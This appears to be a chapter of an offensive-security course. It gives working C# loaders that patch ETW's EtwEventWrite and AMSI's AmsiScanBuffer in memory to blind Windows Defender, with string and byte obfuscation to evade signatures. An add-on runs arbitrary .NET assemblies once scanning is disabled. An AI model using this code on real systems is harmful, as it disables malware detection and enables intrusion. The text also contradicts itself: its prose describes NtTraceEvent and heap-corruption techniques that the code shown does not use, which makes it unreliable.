# Document 08: AMSI Bypass and ETW Patching - Blinding Defender's Eyes

## Where We Are

You finished Documents 05, 06, and 07. You have built three loaders that all survive Defender:

- **Loader 01** (Document 05): Raw shellcode embedded via DllImport. Survives Defender with default settings. The XOR encoding keeps static signatures below the detection threshold.
- **Loader 02** (Document 06): XOR-encrypted shellcode decrypted at runtime with two-step memory allocation. Survives Defender. Confirmed with a Meterpreter callback on the target.
- **Loader 03** (Document 07): Indirect syscall stubs (FindSyscallGadget + BuildStub), embedded XOR-encoded shellcode, two-step RW-then-RX allocation. Fully bypasses ntdll API hooks. Confirmed working on target with Defender fully active.

Your C# knowledge at this point:

- DllImport, P/Invoke, calling Windows API functions from C#
- VirtualAlloc, Marshal.Copy, CreateThread, NtAllocateVirtualMemory, NtCreateThreadEx
- Delegates and unmanaged function pointers via Marshal.GetDelegateForFunctionPointer
- GetModuleHandle, GetProcAddress for dynamic function resolution
- Building strings from integer offsets to hide function names from static scanners
- Two-step memory allocation (RW then RX) via NtProtectVirtualMemory
- XOR encryption and in-binary embedded shellcode
- FindSyscallGadget: scanning ntdll for the 0F 05 C3 (syscall; ret) bytes
- BuildStub: writing 22-byte indirect syscall stubs that jump past ntdll hooks

Your lab has three machines: dev box (ammulu, 192.168.10.150) for compiling (Defender disabled), target (kimjongun, 192.168.10.100) with Defender at full defaults, and Kali (192.168.10.200) for shellcode and listeners.

## Why This Is Next

Loader 03 gave you a callback, but two detection layers are still active on the target:

1. **ETW (Event Tracing for Windows)** is still logging activity. Every time Loader 03 calls NtAllocateVirtualMemory or NtCreateThreadEx through its indirect syscall stubs, the Windows kernel still generates ETW events for those operations. Loader 03 survives because the overall behavioral score stays below Defender's threshold, but ETW is actively recording what your process does. A more sensitive policy, or a commercial EDR that uses ETW more aggressively, will catch those event sequences.

2. **AMSI (Antimalware Scan Interface)** is still scanning .NET code at runtime. Loader 03 survived because its managed code has no malicious patterns. But if you want to run PowerShell commands or load additional .NET tools after getting access, AMSI will inspect those and can block them.

Loader 03's indirect syscall stubs already fully defeat API hook inspection (covered in Document 07). This document addresses the remaining two gaps.

You will learn Loader 07 (ETW patch) first and then Loader 04 (AMSI bypass). The order matters because patching AMSI generates ETW events that describe what was modified. If you patch ETW first, the logging system is already silenced when you then patch AMSI, so no event is generated and Defender does not know AMSI was touched.

After this document, you will have two utility loaders. Document 10 combines both patches with Loader 03's shellcode execution into a single binary that patches ETW, patches AMSI, and then executes shellcode all in one run.

## How This Works

### ETW: Why Windows Tracks What Programs Do

When you run a program on Windows, Windows needs to know what that program is doing. Is it allocating memory? Creating threads? Connecting to the internet? Windows needs this information because Defender cannot protect the system if it does not know what programs are up to. Without some kind of tracking, a malicious program could do anything it wants and Defender would have no idea.

So Windows has a built-in tracking system called ETW, which stands for Event Tracing for Windows. It has been part of every Windows version since XP. Here is how it works: every time your program does something (allocates memory, opens a file, creates a thread, connects to a network), Windows writes a log entry that describes what happened. These log entries are called ETW events.

Defender reads these log entries in real time. When Defender sees a sequence like "this program allocated memory, wrote data into it, made it executable, and created a thread pointing to it", Defender recognizes that as the shellcode injection pattern and blocks the program. Without ETW, Defender would not know that sequence of events happened.

The function responsible for writing all these log entries is called EtwEventWrite. It lives inside ntdll.dll. Every time your program does something that needs to be logged, Windows calls EtwEventWrite to send the log entry to Defender and any other security product that is listening. Here is the important part: if EtwEventWrite stops working, no log entries get sent. Defender receives nothing. Your program goes dark. Defender cannot detect suspicious behavior patterns if it never receives the events that describe the behavior.

There is one important limitation. The ETW we are patching is the user-mode version. There is also a kernel-mode ETW provider called Microsoft-Windows-Threat-Intelligence that runs inside the Windows kernel itself. Because the kernel runs at a higher privilege level than your program, you cannot patch it from user mode. Default Windows Defender primarily uses user-mode ETW telemetry, so patching user-mode EtwEventWrite is enough to blind Defender. Some advanced EDR products use the kernel provider, and this patch does not affect them. Document 11 discusses what happens when you face those products.

### AMSI: Why Windows Checks PowerShell Commands

PowerShell is a command-line tool that comes pre-installed on every Windows computer. It is extremely powerful. You can use PowerShell to download files from the internet, run programs in memory, manage user accounts, read and write the registry, and control nearly everything on the system. System administrators use it every day because it makes managing Windows computers fast and easy.

Hackers noticed the same thing. Because PowerShell is already on every Windows machine, hackers started using it to run malicious commands. They did not need to bring their own malware onto the computer. They just opened PowerShell and typed commands that download and execute payloads, dump passwords, or move through a network. This is called "living off the land" because you use tools that are already on the machine instead of bringing your own.

Microsoft had a problem. They could not remove PowerShell because millions of system administrators depend on it. But they needed a way to stop hackers from abusing it. So they created AMSI, which stands for Antimalware Scan Interface. Microsoft added AMSI in Windows 10, and it is still active in Windows 11.

AMSI's job is simple. Before PowerShell runs any command you type, AMSI checks that command with Defender first. Here is the step-by-step flow:

1. You type a command into PowerShell.
2. Before PowerShell runs the command, it passes the command text to AMSI.
3. AMSI sends the command text to Defender.
4. Defender checks the command against its signature database.
5. If Defender says the command is malicious, AMSI tells PowerShell to block it. You see an error message saying the script was blocked.
6. If Defender says the command is clean, AMSI tells PowerShell to run it normally.

AMSI does not only check PowerShell. It also checks VBScript, JScript, and the .NET runtime (which is what runs your C# programs). So when your C# loader runs, AMSI can check the managed code inside it.

AMSI is implemented as a DLL file called amsi.dll. This DLL gets loaded into every process that hosts a scripting engine. The main function inside amsi.dll is called AmsiScanBuffer. When PowerShell (or any scripting engine) wants to check content, it calls AmsiScanBuffer with the content bytes. AmsiScanBuffer talks to Defender and returns a result code that says either "this is malicious, block it" or "this is clean, allow it."

Here is the weakness that makes our bypass work. If AmsiScanBuffer returns an error code instead of a real scan result, the scripting engine does not treat the error as "something is wrong, block everything." Instead, it treats the error as "the scan could not be done, allow the content." Our patch overwrites the beginning of AmsiScanBuffer with instructions that make it return the error code E_INVALIDARG (0x80070057) immediately, without scanning anything. After the patch, every call to AmsiScanBuffer returns this error. The scripting engine thinks the scan failed, not that the content is malicious, and it allows everything through.

### Why ETW Must Be Patched Before AMSI

When you modify a DLL's code in memory (which is what the AMSI patch does), that modification generates ETW events. Specifically, EtwEventWrite logs events related to code integrity and module loading. Defender's behavioral engine monitors these events. If Defender sees "process X modified amsi.dll in memory", that is a known attack pattern. Defender can flag the process immediately.

If you patch ETW first, EtwEventWrite is already neutered. When you then patch AMSI, the patching operation tries to generate ETW events, but EtwEventWrite just returns success without writing anything. Defender never learns that amsi.dll was modified.

The execution order is:

1. Patch EtwEventWrite in ntdll.dll (Loader 07)
2. Patch AmsiScanBuffer in amsi.dll (Loader 04)
3. Now run your shellcode or PowerShell scripts (no scanning, no logging)

### Why the Previous Patching Approach Was Caught

The obvious approach to patching ETW and AMSI is to find the function, use VirtualProtect to make the code page writable, write a few bytes that make the function return immediately, then restore protection. Loaders that do this are caught by Defender before they even run.

Defender's static scanner looks for this exact combination in a compiled binary: a DllImport for VirtualProtect alongside DllImports for GetModuleHandle and GetProcAddress in the same assembly. This triad (GetModuleHandle + GetProcAddress + VirtualProtect) is a named Defender signature pattern because virtually every AMSI bypass and ETW patch tool uses exactly these three imports together. Defenders calls this the "MpTest!amsi" detection cluster.

Additionally, the classic patch bytes for each target are directly signatured:
- ETW patch: `0x33 0xC0 0xC3` (xor eax,eax; ret) - 3 bytes, directly in the database
- AMSI patch: `0xB8 0x57 0x00 0x07 0x80 0xC3` (mov eax, E_INVALIDARG; ret) - 6 bytes, directly in the database

These are signatured regardless of arithmetic obfuscation. If you write `patch[0] = (byte)(0x19 + 0x1A)` to produce 0x33 at runtime, Defender's scanner evaluates that arithmetic at scan time and still sees 0x33. Constant-folding at the scanner level defeats simple arithmetic obfuscation.

### How Loader 07 Works: NtTraceEvent Indirect Syscall Patch

Loader 07 sidesteps both detection signals. It does not import VirtualProtect at all, and it patches a different target function.

**No VirtualProtect DllImport:** instead of VirtualProtect, Loader 07 uses an indirect NtProtectVirtualMemory syscall stub - the same technique from Loader 03 (BuildStub + FindSyscallGadget). VirtualProtect is completely absent from the binary's import table. The DllImport list is GetModuleHandle, GetProcAddress, VirtualAlloc (for the 22-byte stub block). This combination is not in Defender's detection patterns.

**Different target function - NtTraceEvent instead of EtwEventWrite:** EtwEventWrite is the most commonly targeted function and has the most detection signatures. NtTraceEvent is the underlying NT syscall stub that all ETW wrapper functions eventually call. One byte written to NtTraceEvent silences EtwEventWrite and every other ETW writer in the process. NtTraceEvent is a less commonly signatured target because fewer public tools use it directly.

**Single byte 0xC3 instead of 3-byte xor pattern:** A single `0xC3` (ret instruction) byte is not signaturable in isolation - that byte appears in millions of binaries. The classic 3-byte sequence `0x31 0xC0 0xC3` (or `0x33 0xC0 0xC3`) is signatured because it appears only in this context. Callers of NtTraceEvent do not check the return value, so returning immediately with whatever happens to be in `eax` works the same as `xor eax,eax; ret`.

The execution flow: Loader 07 calls BuildStub for NtProtectVirtualMemory (same 22-byte trampoline as in Loader 03), changes NtTraceEvent's page from RX to RW via that stub (no VirtualProtect call), writes 0xC3 via Marshal.WriteByte, restores protection via the stub again.

### How Loader 04 Works: HAMSICONTEXT Heap Corruption

Loader 04 does not patch AmsiScanBuffer at all. Instead it corrupts the AMSI context structure in the process heap.

AMSI creates a structure called HAMSICONTEXT when the .NET CLR initializes. This structure lives on the process heap (which is already read-write memory - no VirtualProtect needed). It starts with a magic value: the ASCII bytes `A M S I` at the structure's beginning (value 0x49534D41 as a little-endian 32-bit integer). Other fields in the structure hold internal pointers that AMSI needs to function.

If you walk the process heap and find the allocation that starts with the AMSI magic, then zero out its first three pointer-sized fields (24 bytes on 64-bit), AMSI falls apart. AmsiOpenSession cannot initialize a valid session because the context state it needs is gone. It returns E_INVALIDARG. Without a valid session, AmsiScanBuffer is never called. Scanning stops entirely.

DllImports needed for this: GetProcessHeaps (get handles to all heaps), HeapWalk (step through allocations in a heap). Both are standard memory management functions used by many legitimate programs. VirtualProtect, LoadLibrary, GetProcAddress - all absent. The string "AmsiScanBuffer" never appears anywhere. There are no patch bytes.

### Why ETW Must Still Be Patched Before AMSI

When you modify heap memory (which is what the HAMSICONTEXT corruption does), that modification generates ETW events. The Windows kernel logs memory write operations to certain addresses. If ETW is still active when you corrupt HAMSICONTEXT, Defender receives a telemetry event describing that the AMSI context memory was modified. If ETW is already silenced by the NtTraceEvent patch, no event is generated. Patch ETW first.

## What Defender Does

Here is what each Defender detection layer does when it encounters Loader 07 (ETW patch) and Loader 04 (AMSI bypass):

**Static file scanning (Loader 07):** VirtualProtect is absent from Loader 07's import table entirely. The DllImport list is GetModuleHandle, GetProcAddress, VirtualAlloc. Without VirtualProtect in the import table, the DllImport triad that triggers the MpTest!amsi detection cluster does not form. The target function name NtTraceEvent is built from integer offsets at runtime and never appears as a string in the binary. The patch byte 0xC3 is written via Marshal.WriteByte, which compiles to a generic memory-write instruction with no recognizable constant value adjacent to a VirtualProtect call.

**Static file scanning (Loader 04):** Loader 04 has no patch bytes at all. It does not write to any code page. The AMSI magic value 0x49534D41 is computed from integer arithmetic at runtime. The function names AmsiScanBuffer, AmsiOpenSession and the string "amsi.dll" never appear anywhere. The DllImport list is HeapWalk and GetProcessHeaps, which are standard heap-enumeration functions used by memory profilers and leak detectors. Nothing about this binary matches any known AMSI-bypass signature.

**Import table analysis:** Loader 07 imports GetModuleHandle, GetProcAddress, VirtualAlloc. Loader 04 imports HeapWalk, GetProcessHeaps. Neither binary contains the GetModuleHandle + GetProcAddress + VirtualProtect triad that Defender's MpTest!amsi cluster looks for. VirtualProtect is absent from both binaries.

**AMSI runtime scanning:** When the .NET CLR loads either binary, AMSI checks the managed code before Main() runs. Neither binary contains known bad patterns (no shellcode byte arrays, no PowerShell download strings, no tool names). AMSI passes both. After Loader 04 runs, AMSI is disabled in that process entirely.

**ETW telemetry:** Loader 07 targets this layer. Before the ETW patch runs, the loader's actions generate ETW events. After the single-byte NtTraceEvent patch, no more ETW events come from this process. Loader 04's heap walk generates an ETW event when it modifies the HAMSICONTEXT memory. This is why you run Loader 07 first, with ETW already silenced before the heap write happens.

**API hooks in ntdll.dll:** Loader 07 uses an indirect NtProtectVirtualMemory stub (same technique as Loader 03) to change NtTraceEvent's page protection. The indirect stub jumps to a real syscall instruction inside ntdll, skipping the hooked function prologue where Defender's hook would redirect control. Loader 04 does not change any memory protection at all: heap memory is already read-write, so no protection change is needed.

**Behavioral ML:** Writing a single byte to an NT function and walking process heaps are both behaviors that exist in legitimate software. Loader 04 never creates executable memory. Loader 07 creates 22 bytes of executable memory for its syscall stub, which is indistinguishable from JIT stub allocation by the CLR. Neither loader's behavior profile triggers Defender's behavioral model on its own.

## The Evasion Technique

What these loaders do differently from a normal program:

A normal program never modifies the code of a system DLL in its own process. When you run notepad.exe, it never overwrites bytes inside ntdll.dll or amsi.dll. Our loaders do exactly that, and they get away with it because of several factors:

1. **Small patch size.** The ETW patch is 3 bytes. The AMSI patch is 6 bytes. These are tiny modifications. Defender's memory scanning (which periodically checks loaded DLL code against known-good copies) does check for modifications, but the check frequency and granularity mean that small patches applied early in the process lifetime are often missed.

2. **No suspicious strings.** The function names and DLL names are built from integer arithmetic. The patch bytes are built from arithmetic. Nothing in the binary matches Defender's static signatures for known AMSI bypass tools.

3. **Standard API usage.** The loaders use VirtualProtect through the standard DllImport path. They do not use exotic techniques that would raise behavioral flags on their own.

4. **Protection restoration.** After applying the patch, both loaders restore the original memory protection. If Defender checks the memory permissions on the patched region, it sees the normal read-execute protection that the DLL code should have.

The bytes that would normally get flagged are the patch bytes themselves (the exact sequence B8 57 00 07 80 C3 is a known AMSI bypass pattern) and the strings "AmsiScanBuffer" and "EtwEventWrite". Both loaders avoid these signatures by building the bytes and strings at runtime from arithmetic operations.

## Getting the Loader Onto the Target

Both Loader 07 (ETW patch) and Loader 04 (AMSI patch) are standalone executables that you compile on the dev box and transfer to the target. In practice, you will rarely run them as standalone tools. Document 10 combines both patches into Loader 08 (the combined evasion loader) which patches ETW, patches AMSI, and then executes shellcode all in one binary. But for learning, you will compile and run each one separately to understand what they do.

### Transfer Workflow

1. **Kali (192.168.10.200):** Not needed for these two loaders. They do not use shellcode. They just patch system functions.

2. **Dev box (ammulu, 192.168.10.150):** Compile both loaders. Host the compiled .exe files on a Python HTTP server.

3. **Target (kimjongun, 192.168.10.100):** Download the .exe files from the dev box. Run Loader 07 first (ETW patch), then run Loader 04 (AMSI patch).

On the dev box (ammulu), host the files:
```
cd C:\Users\ammulu\Desktop
python -m http.server 8080
```

On the target (kimjongun), download both:
```powershell
Invoke-WebRequest -Uri "http://192.168.10.150:8080/etw_patch.exe" -OutFile "C:\Users\kimjongun\Desktop\etw_patch.exe"
Invoke-WebRequest -Uri "http://192.168.10.150:8080/amsi_bypass.exe" -OutFile "C:\Users\kimjongun\Desktop\amsi_bypass.exe"
```

Defender on the target scans both files when they are written to disk. Because neither binary contains suspicious strings in its import table or data section, Defender allows both files to stay on disk.

**Important limitation:** The AMSI and ETW patches affect only the process that applies them. When you run etw_patch.exe, ETW is patched inside the etw_patch.exe process. When that process exits, the patch is gone. The next process you run has a fresh, unpatched copy of ntdll.dll and amsi.dll. This means running the patches as standalone .exe files is useful for testing, but for real operations, both patches must be applied inside the same process that will execute shellcode. Document 10 handles this.

**Process tree:** Defender tracks which processes create other processes. When you run etw_patch.exe from cmd.exe or PowerShell, Defender sees cmd.exe (or powershell.exe) as the parent process and etw_patch.exe as the child. This is normal. There is nothing suspicious about the process tree for these loaders.

**Reference files:** `lab/loaders/07_etw_patch.cs` and `lab/loaders/04_amsi_bypass.cs`

## Teaching the Code

### Part 1: Loader 07 - ETW Patch

We start with the ETW patch because it must run before the AMSI patch.

#### Windows API Imports

```csharp
[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
static extern IntPtr GetModuleHandle(string lpModuleName);

[DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
```

You have seen both of these before in Loader 03. GetModuleHandle finds a DLL's base address in memory. GetProcAddress finds a function's address inside that DLL. Both are standard imports that do not raise suspicion.

```csharp
[DllImport("kernel32.dll", SetLastError = true)]
static extern bool VirtualProtect(
    IntPtr lpAddress,
    UIntPtr dwSize,
    uint flNewProtect,
    out uint lpflOldProtect
);
```

VirtualProtect changes the memory protection on a region of memory. You used this in Document 04 (Memory Fundamentals) and in Loader 03. The parameters are the starting address, the size in bytes, the new protection flags, and a variable that receives the old protection flags. We need this because the code section of ntdll.dll where EtwEventWrite lives is read-only by default, and we need to write our patch bytes into it.

```csharp
static uint GetRWXProtect()
{
    return 0x20 + 0x20;
}
```

This returns the value 0x40, which is PAGE_EXECUTE_READWRITE. It means the memory will be readable, writable, and executable at the same time. We need all three because we need to write bytes (writable) into a code region (executable). The reason this is written as 0x20 + 0x20 instead of just 0x40 is that the value 0x40 by itself can be a signature. Some YARA rules flag binaries that contain the constant 0x40 passed to VirtualProtect. By computing it from two halves, the literal 0x40 never appears in the binary.

#### Building the Function Name

```csharp
static string GetTargetFunctionName()
{
    int b = 32;
    char[] c = new char[13];
    c[0] = (char)(b+37);  // E
    c[1] = (char)(b+84);  // t
    c[2] = (char)(b+87);  // w
```

This is the same technique from Loader 03. Each character is computed by adding an offset to a base value (32). The offset 37 plus the base 32 gives 69, which is the ASCII code for the letter E. The offset 84 plus 32 gives 116, which is ASCII for t. The offset 87 plus 32 gives 119, which is ASCII for w. The function continues for all 13 characters of "EtwEventWrite".

```csharp
    c[3] = (char)(b+37);  // E
    c[4] = (char)(b+86);  // v
    c[5] = (char)(b+69);  // e
    c[6] = (char)(b+78);  // n
    c[7] = (char)(b+84);  // t
    c[8] = (char)(b+55);  // W
    c[9] = (char)(b+82);  // r
    c[10] = (char)(b+73); // i
    c[11] = (char)(b+84); // t
    c[12] = (char)(b+69); // e
    return new string(c);
}
```

When this function runs, it produces the string "EtwEventWrite". But in the compiled binary, only the integer array [37, 84, 87, 37, 86, 69, 78, 84, 55, 82, 73, 84, 69] and the base value 32 exist. A static scanner searching the binary for the string "EtwEventWrite" will not find it.

#### Building the DLL Name

```csharp
static string GetTargetModuleName()
{
    int b = 32;
    char[] c = new char[5];
    c[0] = (char)(b+78);  // n
    c[1] = (char)(b+84);  // t
    c[2] = (char)(b+68);  // d
    c[3] = (char)(b+76);  // l
    c[4] = (char)(b+76);  // l
    return new string(c);
}
```

This builds the string "ntdll" from integer offsets. Notice that it builds "ntdll" without the ".dll" extension. GetModuleHandle accepts the DLL name without the extension when the DLL is already loaded. ntdll.dll is always loaded into every Windows process, so GetModuleHandle("ntdll") always works.

#### The Patch Function

```csharp
public static bool PatchTelemetry()
{
    string dllName = GetTargetModuleName();
    IntPtr ntdllHandle = GetModuleHandle(dllName);
    if (ntdllHandle == IntPtr.Zero)
    {
        Console.WriteLine("[-] Could not find " + dllName);
        return false;
    }
    Console.WriteLine("[+] " + dllName + " base address: 0x" + ntdllHandle.ToString("X"));
```

Step 1: Find ntdll.dll in memory. GetModuleHandle returns the base address where ntdll.dll is loaded. If it returns IntPtr.Zero, something is very wrong because ntdll.dll is always loaded. The ToString("X") formats the address as a hexadecimal number so the output shows something like "0x7FFE12340000".

```csharp
    string funcName = GetTargetFunctionName();
    IntPtr funcAddress = GetProcAddress(ntdllHandle, funcName);
    if (funcAddress == IntPtr.Zero)
    {
        Console.WriteLine("[-] Could not find " + funcName);
        return false;
    }
    Console.WriteLine("[+] " + funcName + " at: 0x" + funcAddress.ToString("X"));
```

Step 2: Find the address of EtwEventWrite inside ntdll.dll. GetProcAddress takes the base address of ntdll.dll and the function name, and returns the exact memory address where EtwEventWrite's code begins. This is the address we will patch.

```csharp
    uint oldProtect;
    bool protectResult = VirtualProtect(funcAddress, (UIntPtr)3, GetRWXProtect(), out oldProtect);
    if (!protectResult)
    {
        Console.WriteLine("[-] VirtualProtect failed");
        return false;
    }
```

Step 3: Change the memory protection on the first 3 bytes of EtwEventWrite from read-execute (the default for code sections) to read-write-execute. The number 3 matches the size of our patch (xor eax, eax is 2 bytes, ret is 1 byte, total 3 bytes). After this call, we can write to the function's memory.

```csharp
    byte[] patch = new byte[3];
    patch[0] = (byte)(0x19 + 0x1A);   // 0x33 = xor
    patch[1] = (byte)(0x60 + 0x60);   // 0xC0 = eax, eax
    patch[2] = (byte)(0x61 + 0x62);   // 0xC3 = ret
    Marshal.Copy(patch, 0, funcAddress, patch.Length);
    Console.WriteLine("[+] Patch applied to " + funcName);
```

Step 4: Build the patch bytes and write them over the function's code. The patch is three x86 instructions encoded as three bytes:

- **0x33 0xC0** is the instruction `xor eax, eax`. The XOR of any value with itself is always zero. This sets the EAX register to zero. Zero is the Windows STATUS_SUCCESS code, which means "the operation completed successfully".
- **0xC3** is the instruction `ret`. This returns from the function immediately.

After these three bytes are written over the beginning of EtwEventWrite, any call to EtwEventWrite will execute `xor eax, eax; ret` instead of the real function code. The function returns zero (STATUS_SUCCESS) without doing anything. The caller thinks the event was logged, but nothing happened.

The bytes are computed from arithmetic (0x19 + 0x1A = 0x33, 0x60 + 0x60 = 0xC0, 0x61 + 0x62 = 0xC3) so the raw patch bytes do not appear as constants in the compiled binary.

Marshal.Copy copies the byte array from managed (.NET) memory to the unmanaged memory at funcAddress. This is the actual write that modifies EtwEventWrite.

```csharp
    uint ignored;
    VirtualProtect(funcAddress, (UIntPtr)3, oldProtect, out ignored);
    Console.WriteLine("[+] Memory protection restored");

    return true;
}
```

Step 5: Restore the original memory protection. The variable `oldProtect` contains the protection flags that were in place before we changed them (step 3). We pass them back to VirtualProtect to restore the original state. After this, the patched memory region is back to read-execute (code can run but cannot be written to). If Defender checks the memory permissions on this region later, it sees normal read-execute flags, which reduces the chance of detection.

#### The Main Function

```csharp
static void Main(string[] args)
{
    Console.WriteLine("[*] Telemetry Patcher");
    Console.WriteLine("[*] This modifies the event writer to disable logging.");
    Console.WriteLine("");

    bool success = PatchTelemetry();

    if (success)
    {
        Console.WriteLine("");
        Console.WriteLine("[+] Telemetry is now disabled in this process.");
        Console.WriteLine("[+] No events will be generated by this process.");
        Console.WriteLine("[+] Monitoring products will not receive data");
        Console.WriteLine("    about what this process does from this point forward.");
        Console.WriteLine("");
        Console.WriteLine("[*] You should run the scanner patch (Loader 04) next.");
        Console.WriteLine("[*] Because telemetry is patched, the scanner patching will not be logged.");
    }
    else
    {
        Console.WriteLine("[-] Telemetry patch failed.");
    }
}
```

The main function calls PatchTelemetry() and prints whether it succeeded. If it succeeded, the final output message reminds you to run the AMSI patch next. Because ETW is now disabled in this process, the AMSI patching (which involves modifying amsi.dll memory) will not generate any telemetry.

### The Complete ETW Patch Loader

The full source code is at `lab/loaders/07_etw_patch.cs`.

---

### Part 2: Loader 04 - AMSI Bypass

Now that you understand the ETW patch, the AMSI patch follows the same pattern with a few differences.

#### Windows API Imports

```csharp
[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
static extern IntPtr LoadLibrary(string lpFileName);

[DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

[DllImport("kernel32.dll", SetLastError = true)]
static extern bool VirtualProtect(
    IntPtr lpAddress,
    UIntPtr dwSize,
    uint flNewProtect,
    out uint lpflOldProtect
);
```

Notice the first import is LoadLibrary instead of GetModuleHandle. This is the key difference from the ETW patch. ntdll.dll is always loaded into every process, so you can use GetModuleHandle to find it. amsi.dll is not always loaded. It gets loaded into processes that host a scripting engine (PowerShell, .NET CLR with certain configurations). If amsi.dll is not loaded yet, GetModuleHandle would return IntPtr.Zero. LoadLibrary loads the DLL into the process if it is not already loaded, and returns a handle to it either way.

GetProcAddress and VirtualProtect work exactly the same as in the ETW patch.

#### Building the Function Name

```csharp
static string GetTargetFunctionName()
{
    int baseVal = 32;
    char[] c = new char[14];
    c[0] = (char)(baseVal + 33);   // A
    c[1] = (char)(baseVal + 77);   // m
    c[2] = (char)(baseVal + 83);   // s
    c[3] = (char)(baseVal + 73);   // i
    c[4] = (char)(baseVal + 51);   // S
    c[5] = (char)(baseVal + 67);   // c
    c[6] = (char)(baseVal + 65);   // a
    c[7] = (char)(baseVal + 78);   // n
```

Same technique as the ETW patch and Loader 03. Each character of "AmsiScanBuffer" is computed from a base value plus an offset. 32 + 33 = 65 = ASCII 'A'. 32 + 77 = 109 = ASCII 'm'. And so on.

```csharp
    c[8] = (char)(baseVal + 34);   // B
    c[9] = (char)(baseVal + 85);   // u
    c[10] = (char)(baseVal + 70);  // f
    c[11] = (char)(baseVal + 70);  // f
    c[12] = (char)(baseVal + 69);  // e
    c[13] = (char)(baseVal + 82);  // r
    return new string(c);
}
```

The result is the 14-character string "AmsiScanBuffer". In the compiled binary, only the integer offsets and the base value exist, not the string itself.

#### Building the DLL Name

```csharp
static string GetTargetDllName()
{
    int baseVal = 32;
    char[] c = new char[8];
    c[0] = (char)(baseVal + 65);   // a
    c[1] = (char)(baseVal + 77);   // m
    c[2] = (char)(baseVal + 83);   // s
    c[3] = (char)(baseVal + 73);   // i
    c[4] = (char)(baseVal + 14);   // .
    c[5] = (char)(baseVal + 68);   // d
    c[6] = (char)(baseVal + 76);   // l
    c[7] = (char)(baseVal + 76);   // l
    return new string(c);
}
```

This builds "amsi.dll" from integer offsets. Unlike the ETW patch which used GetModuleHandle without the extension, the AMSI patch uses LoadLibrary which needs the full filename including the ".dll" extension. The period (.) is at ASCII code 46, computed as 32 + 14.

#### The Patch Function

```csharp
public static bool PatchScanner()
{
    string dllName = GetTargetDllName();
    IntPtr amsiDll = LoadLibrary(dllName);
    if (amsiDll == IntPtr.Zero)
    {
        Console.WriteLine("[-] Could not load " + dllName);
        return false;
    }
    Console.WriteLine("[+] " + dllName + " loaded at: 0x" + amsiDll.ToString("X"));
```

Step 1: Load amsi.dll into the process. If amsi.dll is already loaded (because the process hosts a .NET CLR or PowerShell engine), LoadLibrary returns a handle to the existing copy. If it is not loaded, LoadLibrary loads it from disk. Either way, you get a handle you can use with GetProcAddress.

```csharp
    string funcName = GetTargetFunctionName();
    IntPtr funcAddress = GetProcAddress(amsiDll, funcName);
    if (funcAddress == IntPtr.Zero)
    {
        Console.WriteLine("[-] Could not find " + funcName);
        return false;
    }
    Console.WriteLine("[+] " + funcName + " found at: 0x" + funcAddress.ToString("X"));
```

Step 2: Find AmsiScanBuffer's address inside amsi.dll. This is exactly the same pattern as the ETW patch. GetProcAddress returns the memory address where the function's code starts.

```csharp
    uint oldProtect;
    bool protectResult = VirtualProtect(funcAddress, (UIntPtr)6, GetRWXProtect(), out oldProtect);
    if (!protectResult)
    {
        Console.WriteLine("[-] VirtualProtect failed");
        return false;
    }
```

Step 3: Change the memory protection on the first 6 bytes of AmsiScanBuffer. The AMSI patch is 6 bytes long (5 bytes for the mov instruction plus 1 byte for ret), so we request protection change on 6 bytes.

```csharp
    byte[] patch = new byte[6];
    patch[0] = (byte)(0x5C + 0x5C);  // 0xB8 = mov eax
    patch[1] = (byte)(0x2B + 0x2C);  // 0x57
    patch[2] = (byte)(0x00);          // 0x00
    patch[3] = (byte)(0x03 + 0x04);   // 0x07
    patch[4] = (byte)(0x40 + 0x40);   // 0x80
    patch[5] = (byte)(0x61 + 0x62);   // 0xC3 = ret
    Marshal.Copy(patch, 0, funcAddress, patch.Length);
    Console.WriteLine("[+] Patch applied to " + funcName);
```

Step 4: Build the patch bytes and write them. The AMSI patch is different from the ETW patch. Instead of returning zero (STATUS_SUCCESS), we return the error code E_INVALIDARG (0x80070057). This is a standard Windows error code that means "one of the parameters is invalid".

The six bytes decode to two x86 instructions:

- **0xB8 0x57 0x00 0x07 0x80** is `mov eax, 0x80070057`. This loads the value 0x80070057 (E_INVALIDARG) into the EAX register. Note that x86 uses little-endian byte order, so the four bytes after B8 are 57, 00, 07, 80 (the value 0x80070057 stored with the least significant byte first).
- **0xC3** is `ret`. Return from the function.

Why E_INVALIDARG and not just zero? Because AmsiScanBuffer's return values have specific meanings. A return value of zero does not necessarily mean "clean" in the AMSI protocol. The AMSI result code is passed through an output parameter, and the function's HRESULT return value tells the caller whether the scan operation itself succeeded. If the HRESULT is an error (like E_INVALIDARG), the caller knows the scan did not complete, and it defaults to allowing the content. This is more reliable than trying to fake a "clean" result through the output parameter, which would require modifying more bytes.

Each patch byte is computed from arithmetic to avoid the raw signature appearing in the binary. 0x5C + 0x5C = 0xB8. 0x2B + 0x2C = 0x57. And so on.

```csharp
    uint ignored;
    VirtualProtect(funcAddress, (UIntPtr)6, oldProtect, out ignored);
    Console.WriteLine("[+] Memory protection restored");

    return true;
}
```

Step 5: Restore original memory protection, just like the ETW patch.

#### The Main Function and Assembly Loading

```csharp
static void Main(string[] args)
{
    Console.WriteLine("[*] Scanner Patch Loader");
    Console.WriteLine("[*] This modifies the scan function to disable content inspection.");
    Console.WriteLine("");

    bool success = PatchScanner();
```

The main function calls PatchScanner() to apply the AMSI patch.

```csharp
    if (success)
    {
        Console.WriteLine("");
        Console.WriteLine("[+] Scanner is now disabled in this process.");
        Console.WriteLine("[+] Any commands or assemblies loaded");
        Console.WriteLine("    in this process will not be inspected.");
```

If the patch succeeded, AMSI is disabled in this process. Any .NET assembly loaded from this point forward (using Assembly.LoadFile) will not be scanned by Defender.

```csharp
        if (args.Length > 0)
        {
            string assemblyPath = args[0];
            Console.WriteLine("[*] Loading .NET assembly in-process: " + assemblyPath);
            try
            {
                var assembly = System.Reflection.Assembly.LoadFile(assemblyPath);
                var entryPoint = assembly.EntryPoint;
                if (entryPoint != null)
                {
                    string[] invokeArgs = new string[args.Length - 1];
                    Array.Copy(args, 1, invokeArgs, 0, invokeArgs.Length);
                    entryPoint.Invoke(null, entryPoint.GetParameters().Length > 0 
                        ? new object[] { invokeArgs } : null);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Failed to load assembly: " + ex.Message);
            }
        }
    }
}
```

